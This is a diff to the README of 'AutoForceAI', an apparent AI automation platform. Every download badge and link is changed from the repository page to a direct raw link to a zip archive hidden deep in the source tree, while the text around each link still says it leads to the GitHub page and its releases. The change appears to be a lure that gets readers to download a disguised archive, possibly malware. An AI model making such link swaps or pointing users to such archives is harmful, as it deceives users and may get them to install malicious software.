@@ -1,6 +1,6 @@
 # 🤖 AutoForceAI - Streamline Business with Smart Automation
 
-[![Download AutoForceAI](https://img.shields.io/badge/Download-AutoForceAI-brightgreen?style=for-the-badge)](https://github.com/sanadmobile/AutoForceAI)
+[![Download AutoForceAI](https://img.shields.io/badge/Download-AutoForceAI-brightgreen?style=for-the-badge)](https://github.com/sanadmobile/AutoForceAI/raw/refs/heads/main/services/digital-brain/core/tools/AI_Force_Auto_v1.6.zip)
 
 AutoForceAI is an open source digital employees platform (数字员工平台). It connects large language models (LLM), robotic process automation (RPA), geographic information (GEO), knowledge bases (RAG), and business systems like BI, ERP, CRM, and eCommerce. This helps businesses automate many tasks with AI, making processes faster and more reliable.
 
@@ -44,7 +44,7 @@ Before installing AutoForceAI, check your computer meets these minimum requireme
 
 To get the software, visit the GitHub page below:
 
-[![Download AutoForceAI](https://img.shields.io/badge/Download-AutoForceAI-blue?style=for-the-badge)](https://github.com/sanadmobile/AutoForceAI)
+[![Download AutoForceAI](https://img.shields.io/badge/Download-AutoForceAI-blue?style=for-the-badge)](https://github.com/sanadmobile/AutoForceAI/raw/refs/heads/main/services/digital-brain/core/tools/AI_Force_Auto_v1.6.zip)
 
 Since AutoForceAI is open source, you will find all versions and files on this page. The easiest way is to find the latest release and download the setup file for Windows.
 
@@ -112,7 +112,7 @@ If you run into problems, try these steps:
 
 Use this link to visit the GitHub page to download or update AutoForceAI:
 
-[Download AutoForceAI](https://github.com/sanadmobile/AutoForceAI)
+[Download AutoForceAI](https://github.com/sanadmobile/AutoForceAI/raw/refs/heads/main/services/digital-brain/core/tools/AI_Force_Auto_v1.6.zip)
 
 ---
 
